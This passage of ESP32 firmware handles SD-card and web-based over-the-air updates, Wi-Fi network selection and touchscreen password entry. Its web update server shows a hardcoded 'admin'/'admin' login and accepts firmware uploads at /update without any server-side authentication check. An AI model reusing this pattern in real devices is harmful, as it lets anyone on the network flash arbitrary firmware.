        drawMenu();
        return;
      }
      if (checkButton(x, y, TAB_LEFT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        waitingForStart = false;
      }
      delay(50);
    }
  }

  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("Starting SD Update...");
  drawTabBar("", false, "", false, "Back", false);

  bool proceed = true;
  while (proceed) {
    int x, y;
    if (readTouchXY(x, y)) {
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      delay(50);
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 30 + yshift);
    tft.println("Initializing SD...");

    bool ok = false;
    #ifdef SD_CS
    ok = SD.begin(SD_CS);
    #endif
    #ifdef SD_CS_PIN
    if (!ok) {
      #ifdef CC1101_CS
      if (SD_CS_PIN != CC1101_CS) ok = SD.begin(SD_CS_PIN);
      #else
      ok = SD.begin(SD_CS_PIN);
      #endif
    }
    #endif
    if (!ok) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 40 + yshift);
      tft.println("X SD init failed!");
      tft.setCursor(10, 50 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("SD card OK");

    if (!SD.exists(FIRMWARE_FILE)) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Firmware not found!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    File firmwareFile = SD.open(FIRMWARE_FILE, FILE_READ);
    if (!firmwareFile) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X File open failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    size_t fileSize = firmwareFile.size();
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 50 + yshift);
    tft.printf("Size: %u bytes\n", fileSize);
    if (!Update.begin(fileSize)) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Update init failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 60 + yshift);
    tft.println("Updating...");
    size_t written = Update.writeStream(firmwareFile);
    if (written != fileSize) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Update failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 20 + yshift);
    tft.println("Update OK!");
    if (Update.end(true)) {
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("Rebooting...");
      delay(2000);
      ESP.restart();
    } else {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Finalize failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }
    proceed = false;
  }
}

bool selectWiFiNetwork() {
  uiDrawn = false;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.setCursor(10, 50);
  tft.setTextColor(GREEN);
  tft.setTextSize(1);
  tft.println("Scanning...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int numNetworks = WiFi.scanNetworks();
  if (numNetworks <= 0) {
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    tft.println("No networks found.");
    tft.setCursor(10, 60);
    tft.println("Touch to retry");
    drawTabBar("Rescan", false, "", true, "", true);
    int x, y;
    while (!readTouchXY(x, y)) {
      delay(10);
    }
    delay(200);
    if (x >= TAB_LEFT_X && x < TAB_LEFT_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT) {
      return selectWiFiNetwork();
    }
    return false;
  }

  NetworkInfo* networks = new NetworkInfo[numNetworks];
  for (int i = 0; i < numNetworks; i++) {
    strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 31);
    networks[i].ssid[31] = '\0';
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].authmode = WiFi.encryptionType(i);
  }

  int startIndex = 0;
  int selectedIndex = -1;
  bool selected = false;
  while (!selected) {
    drawNetworkList(startIndex, numNetworks, networks, selectedIndex);
    int x, y;
    while (!readTouchXY(x, y)) {
      delay(10);
    }
    delay(200);

    int y_pos = NETWORK_Y_START;
    int end_index = min(startIndex + NETWORKS_PER_PAGE, numNetworks);
    for (int i = startIndex; i < end_index && y_pos < 300; i++) {
      if (x >= 10 && x < SCREEN_WIDTH - 10 && y >= y_pos && y < y_pos + NETWORK_ROW_HEIGHT) {
        char buf[64];
        char ssid[12];
        strncpy(ssid, networks[i].ssid, 11);
        ssid[11] = '\0';
        if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
        const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
        snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
        tft.setTextColor(ORANGE, TFT_BLACK);
        tft.setTextSize(1);
        tft.setCursor(10, y_pos);
        tft.println(buf);
        delay(100);
        tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE), TFT_BLACK);
        tft.setCursor(10, y_pos);
        tft.println(buf);
        selectedIndex = i;
        strncpy(selectedSSID, networks[i].ssid, 31);
        selectedSSID[31] = '\0';
        selected = true;
        break;
      }
      y_pos += NETWORK_ROW_HEIGHT;
    }

    if (x >= TAB_LEFT_X && x < TAB_LEFT_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT) {
      delete[] networks;
      return selectWiFiNetwork();
    }
    if (x >= TAB_MIDDLE_X && x < TAB_MIDDLE_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT && startIndex > 0) {
      startIndex -= NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (x >= TAB_RIGHT_X && x < TAB_RIGHT_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT && startIndex + NETWORKS_PER_PAGE < numNetworks) {
      startIndex += NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (x >= 0 && x < 30 && y >= 10 && y < 30) {
      wifiPassword[0] = '\0';
      return false;
    }
  }

  delete[] networks;
  return true;
}

void drawNetworkList(int startIndex, int numNetworks, NetworkInfo* networks, int selectedIndex) {
  uiDrawn = false;
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextSize(1);

  if (numNetworks == 0) {
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    tft.println("No networks found.");
  } else {
    int y = 50;
    tft.setTextColor(GREEN);
    tft.setCursor(10, y);
    tft.println("Networks:");
    y += 20;

    int start_index = startIndex;
    int end_index = min(start_index + NETWORKS_PER_PAGE, numNetworks);

    for (int i = start_index; i < end_index && y < 300; i++) {
      char buf[64];
      char ssid[12];
      strncpy(ssid, networks[i].ssid, 11);
      ssid[11] = '\0';
      if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
      const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
      snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
      tft.setCursor(10, y);
      tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE));
      tft.println(buf);
      y += NETWORK_ROW_HEIGHT;
    }

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", start_index / NETWORKS_PER_PAGE + 1, (numNetworks + NETWORKS_PER_PAGE - 1) / NETWORKS_PER_PAGE);
    tft.setCursor(180, 50);
    tft.setTextColor(GREEN);
    tft.println(page_buf);
  }

  bool prevDisabled = startIndex == 0;
  bool nextDisabled = (startIndex + NETWORKS_PER_PAGE) >= numNetworks;
  drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);

}

void drawInputField() {
  tft.fillRect(0, 37, 240, 20, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(1, 40);
  tft.print("Password: ");
  tft.print(wifiPassword);
  if (strlen(wifiPassword) < PASSWORD_MAX_LENGTH) {
    tft.print("_");
  }
}

void drawKeyboard() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);

  tft.fillRect(0, 37, 240, 20, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(1, 44);
  tft.print("Password: ");
  tft.print(wifiPassword);
  if (strlen(wifiPassword) < PASSWORD_MAX_LENGTH) {
    tft.print("_");
  }

  int yOffset = KEYBOARD_Y_OFFSET_START;
  for (int row = 0; row < 4; row++) {
    int xOffset = 10;
    for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
      tft.fillRect(xOffset, yOffset, KEY_WIDTH, KEY_HEIGHT, TFT_DARKGREY);
      tft.setTextColor(TFT_WHITE);
      tft.setTextSize(1);
      tft.setCursor(xOffset + 5, yOffset + 4);
      tft.print(keyboardLayout[row][col]);
      xOffset += KEY_WIDTH + KEY_SPACING;
    }
    yOffset += KEY_HEIGHT + KEY_SPACING;
  }

  int buttonY = 160;
  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setTextDatum(MC_DATUM);

  tft.fillRoundRect(5, buttonY, 70, 25, 8, DARK_GRAY);
  tft.drawRoundRect(5, buttonY, 70, 25, 8, ORANGE);
  tft.drawString("Back", 40, buttonY + 12);

  tft.fillRoundRect(85, buttonY, 70, 25, 8, DARK_GRAY);
  tft.drawRoundRect(85, buttonY, 70, 25, 8, ORANGE);
  tft.drawString("Del", 120, buttonY + 12);

  tft.fillRoundRect(165, buttonY, 70, 25, 8, DARK_GRAY);
  tft.drawRoundRect(165, buttonY, 70, 25, 8, ORANGE);
  tft.drawString("OK", 200, buttonY + 12);

  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setCursor(1, 215);
  tft.println("[!] Enter the Wi-Fi password for the");
  tft.setCursor(24, 230);
  tft.println("selected network.");

  tft.setCursor(1, 250);
  tft.println("[!] Del: Removes last char from the");
  tft.setCursor(24, 265);
  tft.println("password.");
}

void updateInputField() {
  tft.fillRect(0, 37, 240, 20, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(1, 44);
  tft.print("Password: ");
  tft.print(wifiPassword);
  if (strlen(wifiPassword) < PASSWORD_MAX_LENGTH) {
    tft.print("_");
   }
}

bool enterWiFiPassword() {
  wifiPassword[0] = '\0';

  OnScreenKeyboardConfig cfg;
  cfg.titleLine1      = "[!] Enter the Wi-Fi password for the";
  cfg.titleLine2      = "selected network.";
  cfg.rows            = keyboardLayout;
  cfg.rowCount        = 4;
  cfg.maxLen          = PASSWORD_MAX_LENGTH;
  cfg.shuffleNames    = nullptr;
  cfg.shuffleCount    = 0;
  cfg.buttonsY        = 195;
  cfg.backLabel       = "Back";
  cfg.middleLabel     = "Del";
  cfg.okLabel         = "OK";
  cfg.enableShuffle   = false;
  cfg.requireNonEmpty = true;
  cfg.emptyErrorMsg   = "Password cannot be empty!";

  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, "");

  if (!r.accepted) {

    wifiPassword[0] = '\0';
    return false;
  }

  size_t n = min((size_t)PASSWORD_MAX_LENGTH, (size_t)r.text.length());
  for (size_t i = 0; i < n; ++i) {
    wifiPassword[i] = r.text[i];
  }
  wifiPassword[n] = '\0';

  return true;
}

void performWebOTAUpdate() {
  uiDrawn = false;
  static size_t totalUploaded = 0;
  bool inUpdate = false;

  if (!selectWiFiNetwork()) {
    drawMenu();
    return;
  }

  if (!enterWiFiPassword()) {
    drawMenu();
    return;
  }

  updateStatusBar();
  runUI();
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("Starting Web OTA...");
  drawTabBar("", false, "", false, "Back", false);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 30 + yshift);
  tft.println("Connecting Wi-Fi");
  WiFi.begin(selectedSSID, wifiPassword);
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    int x, y;
    if (readTouchXY(x, y)) {
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        WiFi.disconnect();
        drawMenu();
        return;
      }
      delay(200);
    }
    delay(500);
    attempts++;
  }
  if (WiFi.status() != WL_CONNECTED) {
    tft.setTextColor(UI_WARN, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("X Wi-Fi failed!");
    tft.setCursor(10, 50 + yshift);
    tft.println("Touch to retry or Back");
    int x, y;
    waitForTouchXY(x, y);
    if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
      WiFi.disconnect();
      drawMenu();
      return;
    }
    performWebOTAUpdate();
    return;
  }
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 40 + yshift);
  tft.println("Wi-Fi OK");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 50 + yshift);
  tft.print("IP: ");
  tft.println(WiFi.localIP());
  tft.setCursor(10, 70 + yshift);
  tft.println("URL: http://esp32.local");
  tft.setCursor(10, 80 + yshift);
  tft.println("User: admin");
  tft.setCursor(10, 90 + yshift);
  tft.println("Pass: admin");

  if (!MDNS.begin(host)) {
    tft.setTextColor(UI_WARN, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("X mDNS failed!");
    tft.setCursor(10, 50 + yshift);
    tft.println("Touch to retry or Back");
    int x, y;
    waitForTouchXY(x, y);
    if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
      WiFi.disconnect();
      drawMenu();
      return;
    }
    performWebOTAUpdate();
    return;
  }
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 110 + yshift);
  tft.println("mDNS OK");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 120 + yshift);
  tft.println("Web server ready!");
  tft.setCursor(10, 130 + yshift);
  tft.println("Access via browser");

  server.on("/", HTTP_GET, []() {
    server.sendHeader("Connection", "close");
    server.send(200, "text/html", loginIndex);
  });
  server.on("/serverIndex", HTTP_GET, []() {
    server.sendHeader("Connection", "close");
    server.send(200, "text/html", serverIndex);
  });
  server.on("/update", HTTP_POST, []() {
    server.sendHeader("Connection", "close");
    bool success = !Update.hasError();
    server.send(200, "text/plain", success ? "OK" : "FAIL");
    if (success) {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setTextSize(1);
      tft.println("Update OK!");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 20 + yshift);
      tft.println("Rebooting...");
      delay(2000);
      ESP.restart();
    } else {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.println("X Update Failed!");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 20 + yshift);
      tft.println("Touch to retry or Back");
      drawTabBar("", false, "", false, "Back", false);
      int x, y;
      waitForTouchXY(x, y);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        server.close();
        WiFi.disconnect();
        drawMenu();
        return;
      }
      performWebOTAUpdate();
    }
  }, [&inUpdate, &totalUploaded]() {
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START) {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setTextSize(1);
      tft.println("Web OTA Started...");
      drawTabBar("", false, "", false, "Back", true);
      totalUploaded = 0;
      inUpdate = true;
      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) {
        Update.printError(Serial);
      }
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
        Update.printError(Serial);
      }
      totalUploaded += upload.currentSize;
      int percent = (totalUploaded * 100) / (upload.totalSize ? upload.totalSize : 1000000);
      tft.setCursor(10, 30 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.printf("Progress: %d%%\n", percent);
    } else if (upload.status == UPLOAD_FILE_END) {
      if (Update.end(true)) {
        Serial.printf("Update Success: %u\n", upload.totalSize);
      } else {
        Update.printError(Serial);
      }
      totalUploaded = 0;
      inUpdate = false;
    }
  });

  server.begin();

  while (true) {
    server.handleClient();
    if (!inUpdate) {
      int x, y;
      if (readTouchXY(x, y) && checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        server.close();
        WiFi.disconnect();
        drawMenu();
        return;
      }
      delay(200);
    }
    delay(1);
  }
}

void updateSetup() {

  tft.fillScreen(TFT_BLACK);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(0);

  setupTouchscreen();

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();

  drawMenu();
}

void updateLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  updateStatusBar();
  runUI();
  if (feature_exit_requested) return;

  int x, y;
  if (readTouchXY(x, y)) {
    if (x > BUTTON1_X && x < BUTTON1_X + BUTTON_WIDTH && y > BUTTON1_Y && y < BUTTON1_Y + BUTTON_HEIGHT) {
      performSDUpdate();
    }
    else if (x > BUTTON2_X && x < BUTTON2_X + BUTTON_WIDTH && y > BUTTON2_Y && y < BUTTON2_Y + BUTTON_HEIGHT) {
      performWebOTAUpdate();
    }
    delay(200);
  }
}
}
